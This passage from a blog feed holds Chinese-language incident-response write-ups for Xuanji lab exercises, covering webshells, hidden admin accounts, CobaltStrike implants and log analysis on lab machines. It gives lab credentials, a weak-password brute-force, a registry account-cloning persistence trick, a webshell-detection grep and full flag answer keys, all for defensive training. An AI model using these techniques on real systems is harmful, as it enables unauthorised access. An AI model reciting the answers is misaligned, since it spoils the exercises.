    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶机可以用玄机的，也可以在公众号下载，这里我选择用自己下载的，感谢划水但不摆烂提供的资源</p><p>题目下载地址：<a href="https://pan.baidu.com/s/14OPvxDgsEsY-O3e34K2FUw?pwd=2024">https://pan.baidu.com/s/14OPvxDgsEsY-O3e34K2FUw?pwd=2024</a></p><p>划水应急工具包：<a href="https://pan.baidu.com/s/1dwBMRQO3TUEMx8FWVeJLew?pwd=ltja">https://pan.baidu.com/s/1dwBMRQO3TUEMx8FWVeJLew?pwd=ltja</a> </p><p>服务器账号密码  admin  Aa123456</p><p>进去后运行phpstudy开启相关服务</p><p>因为玄机的题目是从靶机内部题目挑选的，不完整，因此本文分两部分</p><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p><img src="https://oss.waynejoons.icu/picphoto/20250719181500774.png"></p><h2 id="玄机题目"><a href="#玄机题目" class="headerlink" title="玄机题目"></a>玄机题目</h2><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤#1"></a>步骤#1</h3><p><strong>最早的WebShell落地时间是（时间格式统一为：2022&#x2F;12&#x2F;12&#x2F;2:22:22）;</strong></p><p>上传D盾到目标机器，把<code>C:\phpstudy_pro\WWW</code>目录放入D盾扫描</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719182940827.png"></p><p>发现大量WebShell文件，点进去<code>C:\phpstudy_pro\WWW\attachment\php\2023\11</code>，按时间排序，找到最早的WebShell落地时间即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719183440494.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250719183612285.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2023/11/11/0:30:07&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤#2"></a>步骤#2</h3><p><strong>黑客最早的WebShell密码是多少，将WebShell密码作为Flag值提交；</strong></p><p>用记事本打开WebShell文件，找到连接密码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719183729473.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;pass&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤#3"></a>步骤#3</h3><p><strong>CobaltStrike木马被添加进计划任务的时间是</strong></p><p>win+r输入<code>taskschd.msc</code>打开任务计划程序，找到<code>\Microsoft\Windows\AppID\</code>，查看计划任务，发现有个可疑任务，在每天9:50自动触发，查看启动程序</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719202237569.png"></p><p>但是这个huorong.exe我怎么找都找不到，网上百度了一下，发现别人也找不到，最后查看官方WP确定了这是个木马文件，但是不知道什么原因找不到了</p><p>然后我们导出该文件，用浏览器打开</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719202651632.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250719202738762.png"></p><p>成功得到CobaltStrike木马文件的修改时间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2023/11/15/8:02:20&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-4"><a href="#步骤-4" class="headerlink" title="步骤#4"></a>步骤#4</h3><p><strong>黑客启用并添加进管理员组的用户与时间是 答案格式：Username,2022&#x2F;12&#x2F;12&#x2F;2:22:22）；</strong></p><p>用D盾检测用户账号，发现Guest被启用并添加进管理员组</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719203402299.png"></p><p>cmd打开输入<code>net user guest</code>查看guest的修改时间</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719203753561.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;guest,2023/11/11/0:45:59&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-5"><a href="#步骤-5" class="headerlink" title="步骤#5"></a>步骤#5</h3><p><strong>攻击者使用弱口令登录ftp的时间是</strong></p><p>打开<code>C:\phpstudy_pro\Extensions\FTP0.9.60\Logs</code>查看FTP的登录日志</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719203943003.png"></p><p>总共三个，一个个点进去看看，发现第二个有问题</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719204037239.png"></p><p>成功得到攻击者登录ftp的时间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2023/11/11/1:08:54&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-6"><a href="#步骤-6" class="headerlink" title="步骤#6"></a>步骤#6</h3><p><strong>攻击者使用弱口令登录web管理员的时间是</strong></p><p>这里我们主要审计Apache的日志，打开<code>C:\phpstudy_pro\Extensions\Apache2.4.39\logs</code>，审计<code>access.log.1700006400</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250719204858120.png"></p><p>题目问的是攻击者使用弱口令登录web管理员的时间，我们可以尝试用弱口令自己爆破网站，然后抓取登录成功的包，在日志里面进行匹配，就可以找到攻击者的登录时间</p><p>打开浏览器输入<code>127.0.0.1/index.php</code>，然后点击上一级，回到首页</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719205251094.png"></p><p>用弱口令字典爆破即可，不限方法，爆破得到账号为admin，密码为123456，然后登录抓包</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719205542369.png"></p><p>重新回到日志，ctrl+f搜索<code>index.php?mod=site&amp;act=manager&amp;do=main&amp;beid=1</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250719205937334.png"></p><p>成功得到攻击者登录后台管理页面的时间</p><p>如果你不想爆破网站，直接分析日志也可以，一般情况下登录成功会有302跳转，我们可以直接筛选302跳转，并根据日志特征进行匹配</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719210333921.png"></p><p>可以看到URI里面包含manager，通过上下文分析，可以确定这是登录成功的跳转页面，不过想更精确的话还是第一种方法好</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2023/11/15/7:38:31&#125;</span><br></pre></td></tr></table></figure><h2 id="靶机内部题目（除去相同题目）"><a href="#靶机内部题目（除去相同题目）" class="headerlink" title="靶机内部题目（除去相同题目）"></a>靶机内部题目（除去相同题目）</h2><h3 id="步骤-7"><a href="#步骤-7" class="headerlink" title="步骤#7"></a>步骤#7</h3><p><strong>CobaltStrike远程控制木马的文件名与落地时间是？（答案格式：ABC.exe,2022&#x2F;12&#x2F;12&#x2F;2:22:22）</strong></p><p>这题我用绿盟D-Eyes扫了很久都没扫出来，在安全中心的隔离区也没找到，不知道什么原因，查找计划任务里面的木马路径也没有</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719211854018.png"></p><p>一般情况下遇到这种题目，我们用安全工具扫描就可以，例如火绒、绿盟D-Eyes等，但是这里不知道为什么电脑找不到这个木马</p><p>这里直接给出官方的答案</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">huorong.exe,2023/11/15/7:45:47</span><br></pre></td></tr></table></figure><h3 id="步骤-8"><a href="#步骤-8" class="headerlink" title="步骤#8"></a>步骤#8</h3><p><strong>攻击者查看上传回显路径的时间是？</strong></p><p>攻击者上传木马之后，需要知道文件被上传到哪里，这时我们从攻击者登录后台管理员账号的时间之后开始审计日志</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719214937022.png"></p><p>这里可以看到，在一大波注入攻击之后出现一个文件查询的URI，猜测是显示文件路径的，我们粘贴到网页执行（先登录网站）</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719215427117.png"></p><p>这些参数的URL就是木马文件路径，可以尝试蚁剑连接验证</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719215849492.png"></p><p>确定是木马文件，成功得到攻击者查看上传回显路径的时间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2023/11/15/7:38:53</span><br></pre></td></tr></table></figure><h3 id="步骤-9"><a href="#步骤-9" class="headerlink" title="步骤#9"></a>步骤#9</h3><p><strong>第二批WebShell的最早上传时间是？</strong></p><p>前面我们知道了木马的回显路径，因此可以在该路径上进行分析，打开<code>C:\phpstudy_pro\WWW\attachment\2023\11</code>，然后按时间排序，可以看到木马的上传时间分两个时间段，一些是2023&#x2F;11&#x2F;11，另一些是2023&#x2F;11&#x2F;15</p><p><img src="https://oss.waynejoons.icu/picphoto/20250720111723985.png"></p><p>打开15号最早的文件验证，确定是木马文件</p><p><img src="https://oss.waynejoons.icu/picphoto/20250720111745290.png"></p><p>右键打开属性，获取具体时间</p><p><img src="https://oss.waynejoons.icu/picphoto/20250720112146275.png"></p><p>当然如果想稳妥的话还是分析日志文件好，打开<code>C:\phpstudy_pro\Extensions\Apache2.4.39\logs\access.log.1700006400</code>，筛选出状态码为200的日志记录进行分析</p><p><img src="https://oss.waynejoons.icu/picphoto/20250720112740417.png"></p><p>可以看到这里攻击者采用了SSRF攻击，通过在<code>inc_config.php</code>写入木马，让网站去fetch这个文件并保存在本地，然后通过webshell连接并控制网站，因此第二批WebShell的最早上传时间就是这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2023/11/15/7:40:10</span><br></pre></td></tr></table></figure><h3 id="步骤-10"><a href="#步骤-10" class="headerlink" title="步骤#10"></a>步骤#10</h3><p><strong>根据上题线索，WebShell开始通信的时间是？</strong></p><p>沿着上面的日志记录继续往下分析，发现可疑记录</p><p><img src="https://oss.waynejoons.icu/picphoto/20250720115617322.png"></p><p>可以看到发送POST请求，与木马文件进行交互，打开文件验证一下</p><p><img src="https://oss.waynejoons.icu/picphoto/20250720115832852.png"></p><p>因此WebShell开始通信的时间就是这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2023/11/15/7:42:36</span><br></pre></td></tr></table></figure><h2 id="靶机内部题目答案"><a href="#靶机内部题目答案" class="headerlink" title="靶机内部题目答案"></a>靶机内部题目答案</h2><p>这是靶机内部<strong>答题.exe</strong>的答案</p><p><img src="https://oss.waynejoons.icu/picphoto/20250720120136515.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><strong>特别鸣谢</strong></p><p>划水但不摆烂：<a href="https://mp.weixin.qq.com/s/4PQ5TaBUUpW_9hkm-kue1Q">https://mp.weixin.qq.com/s/4PQ5TaBUUpW_9hkm-kue1Q</a></p>]]></content>
    
    
    <summary type="html">玄机靶场刷题记录</summary>
    
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/tags/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>玄机靶场 | Where-1S-tHe-Hacker</title>
    <link href="https://waynejoon.github.io/posts/Xuanji-CTF-Where-1S-tHe-Hacker/"/>
    <id>https://waynejoon.github.io/posts/Xuanji-CTF-Where-1S-tHe-Hacker/</id>
    <published>2025-06-18T12:13:42.000Z</published>
    <updated>2025-07-20T05:02:37.010Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我一开始用的是在线靶机，但是因为一些不可抗拒因素，具体参考步骤#11，所以最终把靶机下载到本地分析，同时也能省点金币，题目可以在划水但不摆烂公众号下载</p><p>题目下载地址：<a href="https://pan.baidu.com/s/1MwRbI6Cbz2j_hlHInVL1Bg?pwd=fmzu">https://pan.baidu.com/s/1MwRbI6Cbz2j_hlHInVL1Bg?pwd=fmzu</a></p><p>服务器账号密码  admin  Aa123456</p><p>注：样本请勿在本地运行</p><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p><img src="https://oss.waynejoons.icu/picphoto/20250621145941550.png"></p><h2 id="玄机题目"><a href="#玄机题目" class="headerlink" title="玄机题目"></a>玄机题目</h2><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤#1"></a>步骤#1</h3><p><strong>找到黑客ID 为多少,将黑客ID 作为 FLAG 提交;</strong></p><p>打开网页根目录，发现index.php被挂了黑页，在文件内容里面找到黑客ID</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617162531550.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;X123567X&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤#2"></a>步骤#2</h3><p><strong>找到黑客在什么时间修改了网站主页,将黑客修改了网站主页的时间 作为 FLAG 提交（y-m-d-4:22:33）;</strong></p><p>直接查看属性，找到修改时间</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617163053125.png"></p><p>提交的时候有个问题，如果时间你是直接复制属性中的，提交时会显示错误，因为属性中的时间携带不可见字符，正确的做法是自己手打进去，具体可以看看010editor的分析</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617201037455.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2023-11-6-4:55:13&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤#3"></a>步骤#3</h3><p><strong>找到黑客第一个webshell文件名是,将第一个webshell文件名 作为FLAG 提交;</strong></p><p>可以用D盾，也可以手工排查，这里我选择手工排查</p><p>找到Apache目录下的访问日志</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617165532102.png"></p><p>前面大量的HEAD表示的是黑客在进行目录扫描，可以不看，直接跳到后半部分扫描结束那里，通过排查，发现两个疑似webshell的可疑文件</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617170431824.png"></p><p>去根目录下找到对应的文件，查看进行确认</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250617170613231.png"></p><p>发现两个都是黑客上传的webshell文件，按照时间顺序，第一个webshell文件名是SystemConfig.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;SystemConfig.php&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-4"><a href="#步骤-4" class="headerlink" title="步骤#4"></a>步骤#4</h3><p><strong>找到黑客第二个webshell文件名是,将第二个webshell文件名 作为FLAG 提交;</strong></p><p>同上，第二个webshell文件名是syscon.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;syscon.php&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-5"><a href="#步骤-5" class="headerlink" title="步骤#5"></a>步骤#5</h3><p><strong>找到黑客第二个webshell的连接密码是,将第二个webshell的连接密码 作为FLAG 提交;</strong></p><p>步骤三那里可以得到第二个webshell的连接密码是pass</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;pass&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-6"><a href="#步骤-6" class="headerlink" title="步骤#6"></a>步骤#6</h3><p><strong>找到黑客新建的隐藏账户,将新建的隐藏账户名字 作为FLAG 提交;</strong></p><p>有很多方法可以实现，这里选择注册表查看</p><p>win+r然后输入<code>regedit</code>打开注册表编辑器，找到HKEY_LOCAL_MACHINE\SAM\SAM，但是这里不能直接查看，我们右键点击SAM，赋予完全控制权限</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617171727151.png"></p><p>然后重新打开注册表，进入HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names，找到当前计算机全部用户，发现隐藏用户为admin$</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617171859371.png"></p><p>有时候攻击者可能不会直接新增隐藏用户，而是通过修改Guest用户注册表对应的F值（权限分配）与本地管理Administrator的权限相同，相当于克隆了Administrator，这也需要我们额外注意</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617172829611.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250617172904484.png"></p><p>还有一个方法，就是直接在此电脑那里查看，更快速，但是平时的话还是建议用注册表来分析，更加精准</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250617172433866.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;admin$&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-7"><a href="#步骤-7" class="headerlink" title="步骤#7"></a>步骤#7</h3><p><strong>找到黑客隐藏账户创建时间是,将隐藏账户创建时间是 作为FLAG 提交（答案格式：2024&#x2F;12&#x2F;3 9:16:23）;</strong></p><p>直接cmd打开，输入<code>net user admin$</code>查看账户详细信息</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617173055149.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2023/11/6 4:45:34&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-8"><a href="#步骤-8" class="headerlink" title="步骤#8"></a>步骤#8</h3><p><strong>找到黑客添加隐藏账户进管理员组的时间,将添加隐藏账户进管理员组的时间 作为FLAG 提交（答案格式：2024&#x2F;12&#x2F;3 9:16:23）;</strong></p><p>这里要用到系统事件分析，按Win+R键输入<code>eventvwr.msc</code>打开事件查看器</p><p>常见事件ID类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">4624 登录成功</span><br><span class="line">4625 登录失败，如果有人尝试破解系统密码，可以看到大量连续登录失败信息</span><br><span class="line">4726 删除用户</span><br><span class="line">4722 账号启用</span><br><span class="line">4725 账号禁用</span><br><span class="line">4723 修改密码</span><br><span class="line">4724 重置密码</span><br><span class="line">4634 注销成功</span><br><span class="line">4647 用户启动的注销</span><br><span class="line">4672 管理员登录</span><br><span class="line">4720 创建用户，使用系统漏洞攻击成功后，往往会创建一个用户，方便远程登录</span><br><span class="line">4732 加入安全组，常见于将新用户加入管理员组</span><br><span class="line">4733 移除出安全组</span><br><span class="line">4684 通过登陆界面登陆的</span><br></pre></td></tr></table></figure><p>这里我们筛选4732，时间的话我们根据admin$的创建时间，选择2023&#x2F;11&#x2F;6 4:45:00开始，结束时间随便，可以选小点缩小范围</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617173856062.png"></p><p>一个个点进去查看，找到添加到管理员组的事件</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617174152500.png"></p><p>注意时间格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2023/11/6 4:46:07&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-9"><a href="#步骤-9" class="headerlink" title="步骤#9"></a>步骤#9</h3><p><strong>找到黑客在什么时间从文件中读取保留的密钥,将读取保留的密钥的时间 作为FLAG 提交（答案格式：2024&#x2F;12&#x2F;3 9:16:23）;</strong></p><p>这里我们聚焦于两个事件ID</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5051 将保留的密钥写入文件</span><br><span class="line">5058 从文件中读取保留的密钥</span><br></pre></td></tr></table></figure><p>也是通过事件查看器去找，时间我这里选择不变</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617174904016.png"></p><p>也是按时间顺序找就行</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250617175649943.png"></p><p>注意时间格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2023/11/6 4:46:58&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-10"><a href="#步骤-10" class="headerlink" title="步骤#10"></a>步骤#10</h3><p><strong>找到黑客通过隐藏账户通过(PTH)哈希传递攻击登录的时间是,将(PTH)哈希传递攻击登录的时间 作为FLAG 提交;</strong></p><p>哈希传递攻击指的是攻击者无需知道用户的明文密码，只需窃取密码的哈希值（Hash），就能冒充该用户登录到网络中的其他系统。</p><p>这里我们聚焦于NtLmSsp（NT LAN Manager Security Support Provider），它用于处理 NTLM 协议的身份验证，我们去筛选登录事件，找到登录进程为NtLmSsp的即可，对应的事件ID为4624</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250617180524068.png"></p><p>按照时间顺序一个个筛选</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617180621831.png"></p><p>注意时间格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2023/11/6 4:47:28&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-11"><a href="#步骤-11" class="headerlink" title="步骤#11"></a>步骤#11</h3><p><strong>找到黑客上传的两个CobaltStrike木马文件名,将上传的两个CobaltStrike木马文件名 作为FLAG 提交（答案格式：”A.exe,B.exe”）;</strong></p><p>这里用绿盟D-Eyes主机命令行应急工具，将工具上传到目标机器，cmd输入<code>D-Eyes fs</code>扫盘</p><p>如果是多盘路径可以用<code>D-Eyes fs -P C:\\,D:\\tmp,D:\\tools</code>，也可以用<code>D-Eyes.exe ps</code>进行进程扫描，排查异常进程信息</p><p>这里我们就使用<code>D-Eyes fs</code>扫盘</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617181952959.png"></p><p>这里只找到之前的webshell文件，并没有找到cs可疑文件，原因是部分文件被Windows Defender自动隔离了，需要从隔离区恢复</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617182323541.png"></p><p>这里有个问题，如果用的是玄机靶场的话，已隔离威胁那里是找不到这些被隔离的文件，估计是那边默认给删除了，然后没被工作人员发现</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617192539101.png"></p><p>所以我用的是下载来的靶场，还原文件之后再扫一遍，排查可疑文件，发现多了两个文件</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617190500523.png"></p><p>把SystemTemp.exe和SysnomT.exe放进安恒云沙箱检测（拉取文件到本地之后不要运行）</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617191412052.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250617190959334.png"></p><p>可以看到这两个文件都是cs控制程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;SystemTemp.exe,SysnomT.exe&#125;</span><br></pre></td></tr></table></figure><h2 id="靶机内部题目答案"><a href="#靶机内部题目答案" class="headerlink" title="靶机内部题目答案"></a>靶机内部题目答案</h2><p>这是靶机内部<strong>答题.exe</strong>的答案，不是玄机靶场的答案，玄机的答案在上面各小点里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">X123567X</span><br><span class="line">2023‎年‎11‎月‎6‎日，‏‎4:55:13</span><br><span class="line">SystemConfig.php</span><br><span class="line">syscon.php</span><br><span class="line">pass</span><br><span class="line">admin$</span><br><span class="line">2023/11/6 4:45:34</span><br><span class="line">2023/11/6 4:46:07</span><br><span class="line">2023/11/6 4:46:58</span><br><span class="line">2023/11/6 4:47:28</span><br><span class="line">SystemTemp.exe和SysnomT.exe</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250617194919927.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><strong>特别鸣谢</strong></p><p>划水但不摆烂：<a href="https://mp.weixin.qq.com/s/4UoIw-On-0taB8s0xtjkAw">https://mp.weixin.qq.com/s/4UoIw-On-0taB8s0xtjkAw</a></p><p>Peterpan.exe：<a href="https://blog.csdn.net/administratorlws/article/details/141672688">https://blog.csdn.net/administratorlws/article/details/141672688</a></p>]]></content>
    
    
    <summary type="html">玄机靶场刷题记录</summary>
    
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/tags/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>玄机靶场 | blueteam的小心思</title>
    <link href="https://waynejoon.github.io/posts/Xuanji-CTF-Blue-Team-Forensics/"/>
    <id>https://waynejoon.github.io/posts/Xuanji-CTF-Blue-Team-Forensics/</id>
    <published>2025-01-25T15:13:42.000Z</published>
    <updated>2025-07-20T05:03:22.428Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>玄机靶场日常刷题记录，练练手</p><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p><img src="https://oss.waynejoons.icu/picphoto/20250621145537068.png"></p><h2 id="玄机题目"><a href="#玄机题目" class="headerlink" title="玄机题目"></a>玄机题目</h2><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤#1"></a>步骤#1</h3><p><strong>攻击者通过什么密码成功登录了网站的后台？提交密码字符串的小写md5值，格式flag{md5}。</strong></p><p>在根目录发现wireshark.pcap文件，可以用wireshark进行流量分析</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124213638285.png"></p><p>将文件通过SFTP传到本地，过滤出http流量</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124213730214.png"></p><p>一个一个分析，发现可疑流量，直接得到账号密码</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124213901864.png"></p><p>md5加密得</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d63edb0e9df4cf411398e3658c0237e0&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤#2"></a>步骤#2</h3><p><strong>攻击者在哪个PHP页面中成功上传了后门文件？例如upload.php页面，上传字符串”upload.php”的小写md5值，格式flag{md5}。</strong></p><p>继续往下分析，发现可疑流量</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124214228529.png"></p><p>发现这里上传了一个zip压缩包，追踪TCP流</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124214325549.png"></p><p>发现一句话木马，确定攻击者是通过该页面上传木马文件，加密pluginmgr.php字符得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b05c0be368ffa72e6cb2df7e1e1b27be&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤#3"></a>步骤#3</h3><p><strong>找到攻击者上传的webshell文件，提交该文件的小写md5值，格式flag{md5}。</strong></p><p>直接查找关键字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -r --include=&quot;*.php&quot; &#x27;eval($_POST&#x27; /</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124214732775.png"></p><p>加密文件得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124214821373.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a097b773ced57bb7d51c6719fe8fe5f5&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-4"><a href="#步骤-4" class="headerlink" title="步骤#4"></a>步骤#4</h3><p><strong>攻击者后续又下载了一个可执行的后门程序，提交该文件的小写md5值，格式flag{md5}。</strong></p><p>继续分析流量，发现可疑流量</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124215115623.png"></p><p>发现这个木马文件在尝试下载一个文件，直接搜索这个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;is.world&quot;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124215213748.png"></p><p>这里有个坑，不能直接加密文件，要用引号括起来再加密，不然中间的空格会分隔指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5sum &quot;/var/www/html/plugins/.       /is.world&quot;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124215419804.png"></p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 